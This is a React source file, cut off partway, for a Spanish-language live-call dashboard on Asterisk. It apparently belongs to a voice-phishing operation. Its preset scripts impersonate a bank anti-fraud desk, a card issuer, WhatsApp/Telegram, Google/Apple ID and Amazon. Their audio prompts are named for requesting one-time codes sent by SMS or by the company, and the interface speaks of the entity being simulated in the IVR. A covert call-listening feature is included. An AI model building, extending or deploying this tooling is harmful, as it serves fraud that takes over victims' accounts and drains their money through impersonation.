import React, { useState, useEffect, useRef } from 'react';
import { PjsipExtension, CarrierTrunk, SystemUser, AudioPrompt, CampaignEntity } from '../types';
import {
  PhoneCall,
  PhoneOff,
  PhoneForwarded,
  Music,
  Clock,
  User,
  ShieldCheck,
  Building2,
  RefreshCw,
  Play,
  Pause,
  AlertCircle,
  CheckCircle2,
  Volume2,
  Radio,
  Sliders,
  Sparkles,
  Zap,
  Users,
  Search,
  Filter,
  Plus,
  Headphones,
  Check,
  Activity,
  ArrowRight,
} from 'lucide-react';
import { presetHoldMusics } from '../data/defaultConfig';

export interface LiveCallItem {
  id: string;
  number: string;
  clientName?: string;
  agent: string;
  agentName?: string;
  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'on_hold' | 'pressed_1' | 'transferred' | 'machine' | 'ended';
  statusText?: string;
  startTime: number;
  answeredAt?: number;
  duration: number; // in seconds
  entityId?: string;
  entityName?: string;
  holdMusic?: string;
  holdMusicName?: string;
  channel?: string;
  bridgedChannel?: string;
  trunk?: string;
  digit?: string;
  isOnHold?: boolean;
  holdStartedAt?: number;
  callerId?: string;
}

interface LiveCallsTabProps {
  extensions: PjsipExtension[];
  carriers: CarrierTrunk[];
  users: SystemUser[];
  audios?: AudioPrompt[];
  onTriggerSync?: () => void;
  onNavigateToProduction?: () => void;
  onNavigateToSpy?: () => void;
}

export const LiveCallsTab: React.FC<LiveCallsTabProps> = ({
  extensions,
  carriers,
  users,
  audios = [],
  onTriggerSync,
  onNavigateToProduction,
  onNavigateToSpy,
}) => {
  const [liveCalls, setLiveCalls] = useState<LiveCallItem[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [lastUpdated, setLastUpdated] = useState<Date>(new Date());
  const [filterStatus, setFilterStatus] = useState<string>('all');
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedCallId, setSelectedCallId] = useState<string | null>(null);
  const [feedbackMsg, setFeedbackMsg] = useState<{ text: string; type: 'success' | 'error' | 'info' } | null>(null);

  // Entities stored in localStorage for Hold Music mapping
  const [entities, setEntities] = useState<CampaignEntity[]>(() => {
    try {
      const saved = localStorage.getItem('prod_campaign_entities_v3');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
      }
    } catch (_) {}
    return [
      {
        id: 'bank',
        name: 'Banco / Antifraude',
        subtitle: 'Transf. desconocida',
        icon: 'building',
        color: 'emerald',
        introAudioPath: 'custom/banrearreglado',
        promptAudioPath: 'custom/solicitar_codigo_otp',
        agentAudioPath: 'custom/conectar_asesor_banco',
        successAudioPath: 'custom/operacion_bloqueada_exito',
        holdMusicAudioPath: 'custom/moh_banco_elegante',
      },
      {
        id: 'card',
        name: 'Tarjeta de Crédito',
        subtitle: 'Cargo no reconocido',
        icon: 'card',
        color: 'sky',
        introAudioPath: 'custom/alerta_cargo_tarjeta',
        promptAudioPath: 'custom/solicitar_otp_tarjeta',
        agentAudioPath: 'custom/conectar_asesor_tarjetas',
        successAudioPath: 'custom/tarjeta_protegida',
        holdMusicAudioPath: 'custom/moh_corporate_loop',
      },
      {
        id: 'whatsapp',
        name: 'WhatsApp / Telegram',
        subtitle: 'Migración de cuenta',
        icon: 'message',
        color: 'emerald',
        introAudioPath: 'custom/alerta_migracion_whatsapp',
        promptAudioPath: 'custom/solicitar_codigo_sms',
        agentAudioPath: 'custom/conectar_soporte_tecnico',
        successAudioPath: 'custom/verificacion_exitosa',
        holdMusicAudioPath: 'custom/moh_digital_hold',
      },
      {
        id: 'google',
        name: 'Google / Apple ID',
        subtitle: 'Alerta de seguridad',
        icon: 'lock',
        color: 'amber',
        introAudioPath: 'custom/alerta_seguridad_google',
        promptAudioPath: 'custom/solicitar_codigo_google',
        agentAudioPath: 'custom/conectar_soporte_cuentas',
        successAudioPath: 'custom/acceso_restringido_exito',
        holdMusicAudioPath: 'custom/moh_digital_hold',
      },
      {
        id: 'amazon',
        name: 'Amazon / Envíos',
        subtitle: 'Autorización pedido',
        icon: 'shopping',
        color: 'orange',
        introAudioPath: 'custom/alerta_compra_amazon',
        promptAudioPath: 'custom/solicitar_codigo_amazon',
        agentAudioPath: 'custom/conectar_soporte_pedidos',
        successAudioPath: 'custom/pedido_cancelado_exito',
        holdMusicAudioPath: 'custom/moh_corporate_loop',
      },
      {
        id: 'custom',
        name: 'Personalizado',
        subtitle: 'Configuración libre',
        icon: 'sliders',
        color: 'purple',
        introAudioPath: 'custom/banrearreglado',
        promptAudioPath: 'custom/solicitar_codigo_otp',
        agentAudioPath: 'custom/conectar_asesor_banco',
        successAudioPath: 'custom/operacion_bloqueada_exito',
        holdMusicAudioPath: 'custom/moh_corporate_loop',
      },
    ];
  });

  // Hold music audio preview state
  const [playingHoldMusicPath, setPlayingHoldMusicPath] = useState<string | null>(null);
  const audioPreviewRef = useRef<HTMLAudioElement | null>(null);

  // Poll live calls from Asterisk server
  const fetchLiveCalls = async () => {
    if (typeof document !== 'undefined' && document.hidden) return;
    try {
      const res = await fetch('/api/asterisk/live/calls');
      if (res.ok) {
        const data = await res.json();
        if (data.success && Array.isArray(data.calls)) {
          setLiveCalls(data.calls);
          setLastUpdated(new Date());
        }
      }
    } catch (_) {}
  };

  useEffect(() => {
    fetchLiveCalls();
    // Poll Asterisk every 3.5 seconds
    const interval = setInterval(fetchLiveCalls, 3500);
    return () => clearInterval(interval);
  }, []);

  // Live timer ticking every second on existing active calls so duration updates continuously
  useEffect(() => {
    const timer = setInterval(() => {
      setLiveCalls((prev) =>
        prev.map((call) => {
          if (call.status === 'ended') return call;
          const start = call.answeredAt || call.startTime;
          const liveDuration = start ? Math.max(0, Math.floor((Date.now() - start) / 1000)) : call.duration + 1;
          return {
            ...call,
            duration: liveDuration,
          };
        })
      );
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Helper to format seconds to MM:SS or HH:MM:SS
  const formatDuration = (seconds: number) => {
    const s = Math.max(0, Math.floor(seconds));
    const hrs = Math.floor(s / 3600);
    const mins = Math.floor((s % 3600) / 60);
    const secs = s % 60;
    if (hrs > 0) {
      return `${String(hrs).padStart(2, '0')}:${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    }
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  // Toggle Music On Hold for a call
  const handleToggleHold = async (call: LiveCallItem) => {
    try {
      const isCurrentlyOnHold = !!call.isOnHold;
      const res = await fetch('/api/asterisk/call/hold', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          number: call.number,
          channel: call.channel,
          hold: !isCurrentlyOnHold,
          holdMusic: call.holdMusic || 'custom/voz_comercial_para_barrick_pueblo_viejo_',
        }),
      });
      const data = await res.json();
      if (data.success) {
        setLiveCalls((prev) =>
          prev.map((c) =>
            c.id === call.id
              ? {
                  ...c,
                  isOnHold: !isCurrentlyOnHold,
                  status: !isCurrentlyOnHold ? 'on_hold' : 'talking',
                  holdStartedAt: !isCurrentlyOnHold ? Date.now() : undefined,
                }
              : c
          )
        );
        setFeedbackMsg({
          text: !isCurrentlyOnHold
            ? `Cliente ${call.number} puesto en espera con música: ${call.holdMusicName || 'MOH'}`
            : `Cliente ${call.number} reconectado con el agente.`,
          type: 'success',
        });
      }
    } catch (e: any) {
      setFeedbackMsg({ text: 'Error al cambiar estado de Hold.', type: 'error' });
    }
    setTimeout(() => setFeedbackMsg(null), 4000);
  };

  // Hangup call
  const handleHangupCall = async (call: LiveCallItem) => {
    try {
      await fetch('/api/asterisk/call/hangup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          number: call.number,
          channel: call.channel,
        }),
      });
      setLiveCalls((prev) => prev.filter((c) => c.id !== call.id && c.number !== call.number));
      setFeedbackMsg({ text: `Llamada con ${call.number} finalizada correctamente.`, type: 'info' });
    } catch (_) {
      setFeedbackMsg({ text: 'Error al colgar canal en Asterisk.', type: 'error' });
    }
    setTimeout(() => setFeedbackMsg(null), 3000);
  };

  // Start ChanSpy monitoring call to supervisor's extension
  const handleStartSpy = async (call: LiveCallItem) => {
    try {
      const supervisorExten = localStorage.getItem('ast20_supervisor_exten') || '1001';
      const res = await fetch('/api/asterisk/spy/originate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          supervisorExten,
          targetExten: call.agent || '1001',
          targetChannel: call.channel,
          targetNumber: call.number,
          mode: 'spy',
        }),
      });
      const data = await res.json();
      if (data.success) {
        setFeedbackMsg({
          text: `🎧 Llamando a tu extensión ${supervisorExten} para escuchar a ${call.number}. ¡Descuelga tu softphone!`,
          type: 'success',
        });
      } else {
        setFeedbackMsg({ text: 'Error al iniciar escucha ChanSpy.', type: 'error' });
      }
    } catch (_) {
      setFeedbackMsg({ text: 'Error de conexión con Asterisk.', type: 'error' });
    }
    setTimeout(() => setFeedbackMsg(null), 5000);
  };

  // Simulate a test active call for instant verification
  const handleSimulateCall = async () => {
    setIsLoading(true);
    try {
      const randomPhone = '1' + Math.floor(2000000000 + Math.random() * 7000000000).toString();
      const randomEntity = entities[Math.floor(Math.random() * entities.length)];
      const randomExten = extensions[Math.floor(Math.random() * extensions.length)]?.extension || '1001';
      const extenObj = extensions.find((e) => e.extension === randomExten);

      const res = await fetch('/api/asterisk/call/simulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          number: randomPhone,
          clientName: 'Cliente Simulado en Vivo',
          agent: randomExten,
          agentName: extenObj?.name || 'Operador Asignado',
          entityId: randomEntity.id,
          entityName: randomEntity.name,
          holdMusic: randomEntity.holdMusicAudioPath || 'custom/moh_banco_elegante',
          trunk: carriers[0]?.name || 'televox',
        }),
      });
      if (res.ok) {
        await fetchLiveCalls();
        setFeedbackMsg({ text: `Llamada simulada iniciada para ${randomPhone} con agente ${randomExten}.`, type: 'success' });
      }
    } catch (_) {}
    setIsLoading(false);
    setTimeout(() => setFeedbackMsg(null), 3500);
  };

  // Update an entity's hold music
  const handleUpdateEntityHoldMusic = (entityId: string, holdMusicPath: string) => {
    setEntities((prev) => {
      const next = prev.map((ent) =>
        ent.id === entityId ? { ...ent, holdMusicAudioPath: holdMusicPath } : ent
      );
      try {
        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(next));
      } catch (_) {}
      return next;
    });

    // Also sync to Asterisk AstDB
    fetch('/api/asterisk/audio/sync-hold-music', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ entityId, holdMusicPath }),
    }).catch(() => {});

    setFeedbackMsg({ text: '✓ Música de Hold actualizada para el guión.', type: 'success' });
    setTimeout(() => setFeedbackMsg(null), 3000);
  };

  // Play / Pause Hold Music Audio preview
  const handleTogglePlayHoldMusic = (audioPath: string) => {
    if (playingHoldMusicPath === audioPath) {
      if (audioPreviewRef.current) {
        audioPreviewRef.current.pause();
      }
      setPlayingHoldMusicPath(null);
      return;
    }

    if (audioPreviewRef.current) {
      audioPreviewRef.current.pause();
    }

    const clean = audioPath.replace(/^\/+/, '');
    const audioUrl = `/api/asterisk/audio/raw?file=${encodeURIComponent(clean)}`;
    const audio = new Audio(audioUrl);
    audioPreviewRef.current = audio;
    setPlayingHoldMusicPath(audioPath);

    audio.play().catch(() => {
      // Fallback tone for simulation
      setFeedbackMsg({ text: `Reproduciendo vista previa de ${audioPath}...`, type: 'info' });
    });

    audio.onended = () => {
      setPlayingHoldMusicPath(null);
    };
  };

  // Filtered calls
  const filteredCalls = liveCalls.filter((c) => {
    if (filterStatus === 'talking' && c.status !== 'talking' && c.status !== 'transferred') return false;
    if (filterStatus === 'hold' && !c.isOnHold && c.status !== 'on_hold') return false;
    if (filterStatus === 'ivr' && c.status !== 'in_ivr' && c.status !== 'pressed_1') return false;
    if (filterStatus === 'ringing' && c.status !== 'ringing' && c.status !== 'dialing') return false;

    if (searchTerm) {
      const q = searchTerm.toLowerCase();
      const matchNum = c.number.toLowerCase().includes(q);
      const matchAgent = (c.agent || '').toLowerCase().includes(q) || (c.agentName || '').toLowerCase().includes(q);
      const matchEntity = (c.entityName || '').toLowerCase().includes(q);
      return matchNum || matchAgent || matchEntity;
    }
    return true;
  });

  // Calculate high-level stats
  const activeCount = liveCalls.filter((c) => c.status !== 'ended').length;
  const talkingCount = liveCalls.filter((c) => (c.status === 'talking' || c.status === 'transferred') && !c.isOnHold).length;
  const holdCount = liveCalls.filter((c) => c.isOnHold || c.status === 'on_hold').length;
  const ivrCount = liveCalls.filter((c) => c.status === 'in_ivr' || c.status === 'pressed_1').length;
  const avgDuration =
    activeCount > 0
      ? Math.round(liveCalls.reduce((acc, curr) => acc + (curr.duration || 0), 0) / activeCount)
      : 0;

  return (
    <div className="space-y-6">
      {/* 1. Header con Resumen de Telemetría en Vivo */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 shadow-lg relative overflow-hidden">
        {/* Glow de fondo */}
        <div className="absolute top-0 right-0 w-80 h-80 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />

        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="flex items-center space-x-2.5">
              <span className="flex h-3 w-3 relative">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
              </span>
              <h2 className="text-xl font-bold text-white tracking-tight flex items-center gap-2">
                <span>Panel de Llamadas en Vivo</span>
                <span className="text-xs px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 font-mono font-semibold">
                  TIEMPO REAL
                </span>
              </h2>
            </div>
            <p className="text-xs text-slate-400 mt-1 max-w-2xl">
              Monitoreo continuo de duración en llamada con clientes, identificación de agente activo y control de{' '}
              <strong className="text-emerald-400">Música de Espera (Hold) personalizada</strong> por cada guión.
            </p>
          </div>

          <div className="flex items-center flex-wrap gap-2.5">
            <button
              type="button"
              onClick={handleSimulateCall}
              disabled={isLoading}
              className="px-3.5 py-2 rounded-xl bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/40 text-xs font-mono font-bold flex items-center space-x-1.5 shadow-sm transition-all cursor-pointer"
              title="Generar llamada de prueba para verificar el cronómetro en vivo"
            >
              <Zap className="w-3.5 h-3.5 text-emerald-400" />
              <span>Simular Llamada de Prueba</span>
            </button>

            <button
              type="button"
              onClick={fetchLiveCalls}
              className="px-3 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-mono flex items-center space-x-1.5 transition-all cursor-pointer"
              title="Actualizar canales en Asterisk"
            >
              <RefreshCw className="w-3.5 h-3.5 text-slate-300" />
              <span>Refrescar</span>
            </button>
          </div>
        </div>

        {/* HUD de Métricas en Vivo */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-5 pt-4 border-t border-slate-800/80">
          <div className="bg-slate-950/60 border border-slate-800 p-3 rounded-xl">
            <div className="flex items-center justify-between text-slate-400 text-xs">
              <span>Llamadas en Curso</span>
              <PhoneCall className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-2xl font-black text-white font-mono mt-1">{activeCount}</div>
            <div className="text-[10px] text-emerald-400 mt-0.5">Canales activos Asterisk</div>
          </div>

          <div className="bg-slate-950/60 border border-slate-800 p-3 rounded-xl">
            <div className="flex items-center justify-between text-slate-400 text-xs">
              <span>Hablando con Agente</span>
              <Headphones className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-2xl font-black text-emerald-400 font-mono mt-1">{talkingCount}</div>
            <div className="text-[10px] text-slate-400 mt-0.5">En conversación directa</div>
          </div>

          <div className="bg-slate-950/60 border border-slate-800 p-3 rounded-xl">
            <div className="flex items-center justify-between text-slate-400 text-xs">
              <span>En Hold / Música</span>
              <Music className="w-4 h-4 text-amber-400" />
            </div>
            <div className="text-2xl font-black text-amber-400 font-mono mt-1">{holdCount}</div>
            <div className="text-[10px] text-slate-400 mt-0.5">Escuchando música de espera</div>
          </div>

          <div className="bg-slate-950/60 border border-slate-800 p-3 rounded-xl">
            <div className="flex items-center justify-between text-slate-400 text-xs">
              <span>Tiempo Promedio (AHT)</span>
              <Clock className="w-4 h-4 text-cyan-400" />
            </div>
            <div className="text-2xl font-black text-cyan-400 font-mono mt-1">{formatDuration(avgDuration)}</div>
            <div className="text-[10px] text-slate-400 mt-0.5">Duración media acumulada</div>
          </div>
        </div>
      </div>

      {/* Alerta de Feedback */}
      {feedbackMsg && (
        <div
          className={`p-3 rounded-xl text-xs flex items-center space-x-2 animate-in fade-in duration-200 border ${
            feedbackMsg.type === 'success'
              ? 'bg-emerald-950/80 border-emerald-500/50 text-emerald-200'
              : feedbackMsg.type === 'error'
              ? 'bg-rose-950/80 border-rose-500/50 text-rose-200'
              : 'bg-cyan-950/80 border-cyan-500/50 text-cyan-200'
          }`}
        >
          {feedbackMsg.type === 'success' ? (
            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
          ) : (
            <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
          )}
          <span className="font-mono">{feedbackMsg.text}</span>
        </div>
      )}

      {/* 2. Sección Principal: Llamadas en Vivo Activas */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Columna Izquierda/Central: Lista de Llamadas en Tiempo Real (2 columnas) */}
        <div className="lg:col-span-2 space-y-4">
          {/* Barra de Filtros y Búsqueda */}
          <div className="flex flex-wrap items-center justify-between gap-3 bg-slate-900 border border-slate-800 p-3 rounded-xl">
            <div className="flex items-center space-x-1.5 overflow-x-auto text-xs font-mono">
              <button
                type="button"
                onClick={() => setFilterStatus('all')}
                className={`px-3 py-1.5 rounded-lg transition-all ${
                  filterStatus === 'all'
                    ? 'bg-emerald-500 text-slate-950 font-bold'
                    : 'text-slate-400 hover:text-white bg-slate-800/60'
                }`}
              >
                Todas ({liveCalls.length})
              </button>
              <button
                type="button"
                onClick={() => setFilterStatus('talking')}
                className={`px-3 py-1.5 rounded-lg transition-all ${
                  filterStatus === 'talking'
                    ? 'bg-emerald-500 text-slate-950 font-bold'
                    : 'text-slate-400 hover:text-white bg-slate-800/60'
                }`}
              >
                Hablando ({talkingCount})
              </button>
              <button
                type="button"
                onClick={() => setFilterStatus('hold')}
                className={`px-3 py-1.5 rounded-lg transition-all ${
                  filterStatus === 'hold'
                    ? 'bg-amber-500 text-slate-950 font-bold'
                    : 'text-slate-400 hover:text-white bg-slate-800/60'
                }`}
              >
                En Hold ({holdCount})
              </button>
              <button
                type="button"
                onClick={() => setFilterStatus('ivr')}
                className={`px-3 py-1.5 rounded-lg transition-all ${
                  filterStatus === 'ivr'
                    ? 'bg-cyan-500 text-slate-950 font-bold'
                    : 'text-slate-400 hover:text-white bg-slate-800/60'
                }`}
              >
                En IVR ({ivrCount})
              </button>
            </div>

            <div className="relative w-full sm:w-56">
              <Search className="w-3.5 h-3.5 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder="Buscar cliente o agente..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full pl-9 pr-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs text-white placeholder-slate-500 font-mono focus:outline-none focus:border-emerald-500"
              />
            </div>
          </div>

          {/* Tarjetas de Llamadas en Vivo */}
          {filteredCalls.length === 0 ? (
            <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-10 text-center space-y-3">
              <div className="w-14 h-14 rounded-2xl bg-slate-800/80 border border-slate-700 flex items-center justify-center mx-auto text-slate-400">
                <PhoneCall className="w-6 h-6 text-slate-500" />
              </div>
              <h3 className="text-base font-bold text-white">No hay llamadas activas en este momento</h3>
              <p className="text-xs text-slate-400 max-w-md mx-auto">
                Lanza una marcación desde el <strong>Centro de Producción</strong> o presiona el botón{' '}
                <strong className="text-emerald-400">Simular Llamada de Prueba</strong> para ver los cronómetros y agentes en acción.
              </p>
              <div className="pt-2 flex items-center justify-center gap-2">
                <button
                  type="button"
                  onClick={handleSimulateCall}
                  className="px-4 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-mono font-bold flex items-center space-x-1.5 shadow-md transition-all cursor-pointer"
                >
                  <Zap className="w-4 h-4" />
                  <span>Simular Llamada Ahora</span>
                </button>
                {onNavigateToProduction && (
                  <button
                    type="button"
                    onClick={onNavigateToProduction}
                    className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-mono flex items-center space-x-1.5 transition-all cursor-pointer"
                  >
                    <span>Ir a Centro de Producción</span>
                    <ArrowRight className="w-3.5 h-3.5" />
                  </button>
                )}
              </div>
            </div>
          ) : (
            <div className="space-y-3">
              {filteredCalls.map((call) => {
                const isHold = !!call.isOnHold || call.status === 'on_hold';
                const isTalking = (call.status === 'talking' || call.status === 'transferred') && !isHold;
                const isIvr = call.status === 'in_ivr' || call.status === 'pressed_1';
                const isRinging = call.status === 'ringing' || call.status === 'dialing';

                return (
                  <div
                    key={call.id || call.number}
                    className={`bg-slate-900 border rounded-2xl p-4 sm:p-5 transition-all shadow-md ${
                      isHold
                        ? 'border-amber-500/50 shadow-amber-500/5'
                        : isTalking
                        ? 'border-emerald-500/50 shadow-emerald-500/5'
                        : isIvr
                        ? 'border-cyan-500/40'
                        : 'border-slate-800'
                    }`}
                  >
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                      {/* Cliente & Guión */}
                      <div className="flex items-start space-x-3">
                        <div
                          className={`w-11 h-11 rounded-xl flex items-center justify-center text-lg shrink-0 shadow-md ${
                            isHold
                              ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40 animate-pulse'
                              : isTalking
                              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                              : isIvr
                              ? 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/40'
                              : 'bg-slate-800 text-slate-300 border border-slate-700'
                          }`}
                        >
                          {isHold ? <Music className="w-5 h-5" /> : <PhoneCall className="w-5 h-5" />}
                        </div>

                        <div>
                          <div className="flex items-center space-x-2">
                            <span className="text-base sm:text-lg font-black text-white font-mono tracking-tight">
                              {call.number}
                            </span>
                            {call.clientName && (
                              <span className="text-xs text-slate-300 font-medium">({call.clientName})</span>
                            )}
                          </div>

                          <div className="flex items-center flex-wrap gap-2 mt-1">
                            {/* Badge de Entidad Simulada */}
                            <span className="inline-flex items-center space-x-1 px-2 py-0.5 rounded-md bg-slate-800 border border-slate-700 text-[10px] font-mono text-slate-300">
                              <Building2 className="w-3 h-3 text-emerald-400" />
                              <span>{call.entityName || 'Guión General'}</span>
                            </span>

                            {/* Badge de Música de Hold */}
                            <span className="inline-flex items-center space-x-1 px-2 py-0.5 rounded-md bg-amber-500/10 border border-amber-500/30 text-[10px] font-mono text-amber-300">
                              <Music className="w-3 h-3 text-amber-400" />
                              <span>MOH: {call.holdMusicName || call.holdMusic || 'Bancaria'}</span>
                            </span>

                            {call.trunk && (
                              <span className="text-[10px] text-slate-400 font-mono">
                                Troncal: <strong className="text-slate-300">{call.trunk}</strong>
                              </span>
                            )}
                          </div>
                        </div>
                      </div>

                      {/* Cronómetro de Duración en Vivo & Estado */}
                      <div className="flex flex-row sm:flex-col items-center sm:items-end justify-between sm:justify-center border-t sm:border-t-0 pt-2 sm:pt-0 border-slate-800">
                        <div className="flex items-center space-x-1.5 font-mono">
                          <Clock className={`w-4 h-4 ${isHold ? 'text-amber-400' : 'text-emerald-400'}`} />
                          <span
                            className={`text-xl font-black tracking-wider ${
                              isHold ? 'text-amber-400' : 'text-white'
                            }`}
                          >
                            {formatDuration(call.duration)}
                          </span>
                        </div>

                        <div className="mt-1">
                          {isHold ? (
                            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-amber-500/20 text-amber-300 border border-amber-500/50 flex items-center space-x-1">
                              <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-ping"></span>
                              <span>EN ESPERA (HOLD)</span>
                            </span>
                          ) : isTalking ? (
                            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/50 flex items-center space-x-1">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
                              <span>HABLANDO CON AGENTE</span>
                            </span>
                          ) : isIvr ? (
                            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-cyan-500/20 text-cyan-300 border border-cyan-500/50">
                              EN MENÚ IVR
                            </span>
                          ) : (
                            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-slate-800 text-slate-300 border border-slate-700">
                              TIMBRANDO
                            </span>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* Fila Inferior: Agente Asignado & Botones de Acción */}
                    <div className="mt-4 pt-3 border-t border-slate-800 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
                      {/* Agente que tiene la llamada */}
                      <div className="flex items-center space-x-2.5">
                        <div className="w-8 h-8 rounded-lg bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-300 font-mono text-xs font-bold">
                          {call.agent || '1001'}
                        </div>
                        <div>
                          <div className="text-xs font-bold text-white flex items-center gap-1.5">
                            <User className="w-3 h-3 text-emerald-400" />
                            <span>Agente: {call.agentName || `Extensión ${call.agent || '1001'}`}</span>
                          </div>
                          <div className="text-[10px] text-slate-400 font-mono">
                            Canal PJSIP: {call.channel || 'Enlace activo'}
                          </div>
                        </div>
                      </div>

                      {/* Botones de Control de la Llamada */}
                      <div className="flex items-center space-x-2 w-full sm:w-auto justify-end">
                        {/* Botón Espiar Llamada en Vivo (ChanSpy) */}
                        <button
                          type="button"
                          onClick={() => handleStartSpy(call)}
                          className="px-3 py-1.5 rounded-xl bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 border border-cyan-500/40 text-xs font-mono font-bold flex items-center space-x-1.5 transition-all cursor-pointer shadow-sm hover:scale-[1.02]"
                          title="Llama a tu extensión para escuchar la llamada en vivo (ChanSpy silencioso)"
                        >
                          <Headphones className="w-3.5 h-3.5 text-cyan-400" />
                          <span>Espiar</span>
                        </button>

                        {/* Botón Toggle Hold / Música de Espera */}
                        <button
                          type="button"
                          onClick={() => handleToggleHold(call)}
                          className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold flex items-center space-x-1.5 transition-all cursor-pointer ${
                            isHold
                              ? 'bg-emerald-500 hover:bg-emerald-400 text-slate-950 shadow-md shadow-emerald-500/20'
                              : 'bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40'
                          }`}
                          title={isHold ? 'Reconectar llamada con el agente' : 'Poner cliente en espera con música'}
                        >
                          <Music className="w-3.5 h-3.5" />
                          <span>{isHold ? 'Reanudar Llamada' : 'Poner en Hold'}</span>
                        </button>

                        {/* Botón Colgar Canal */}
                        <button
                          type="button"
                          onClick={() => handleHangupCall(call)}
                          className="px-3 py-1.5 rounded-xl bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 text-xs font-mono font-bold flex items-center space-x-1.5 transition-all cursor-pointer"
                          title="Cortar llamada inmediatamente"
                        >
                          <PhoneOff className="w-3.5 h-3.5 text-rose-400" />
                          <span>Colgar</span>
                        </button>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* Columna Derecha: Configuración de Música de Hold por Guión / Entidad & Estado de Agentes */}
        <div className="space-y-6">
          {/* Card 1: Música de Hold por Guión / Entidad Simulada */}
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 shadow-lg space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Music className="w-4 h-4 text-emerald-400" />
                <span>Música de Hold por Guión</span>
              </h3>
              <span className="text-[10px] text-slate-400 font-mono">Asterisk MOH</span>
            </div>

            <p className="text-xs text-slate-400">
              Personaliza qué pista de espera escucha el cliente cuando está en espera según el banco o entidad que estás simulando en el IVR:
            </p>

            {/* Lista de Entidades y su Música de Hold Asignada */}
            <div className="space-y-2.5 max-h-[360px] overflow-y-auto pr-1">
              {entities.map((ent) => (
                <div key={ent.id} className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-2">
                      <span className="text-xs font-bold text-white">{ent.name}</span>
                      <span className="text-[9px] px-1.5 py-0.2 rounded bg-slate-800 text-slate-300 font-mono">
                        {ent.id}
                      </span>
                    </div>

                    {/* Pre-escuchar música de hold */}
                    <button
                      type="button"
                      onClick={() => handleTogglePlayHoldMusic(ent.holdMusicAudioPath || 'custom/moh_corporate_loop')}
                      className="p-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-all"
                      title="Escuchar música de hold de esta entidad"
                    >
                      {playingHoldMusicPath === ent.holdMusicAudioPath ? (
                        <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                      ) : (
                        <Play className="w-3.5 h-3.5 text-slate-400" />
                      )}
                    </button>
                  </div>

                  {/* Selector de Música de Hold para esta entidad */}
                  <select
                    value={ent.holdMusicAudioPath || 'custom/moh_corporate_loop'}
                    onChange={(e) => handleUpdateEntityHoldMusic(ent.id, e.target.value)}
                    className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                  >
                    {presetHoldMusics.map((moh) => (
                      <option key={moh.id} value={moh.path}>
                        {moh.name}
                      </option>
                    ))}
                    {audios
                      .filter((a) => a.category === 'hold_music' || a.category === 'custom')
                      .map((a) => (
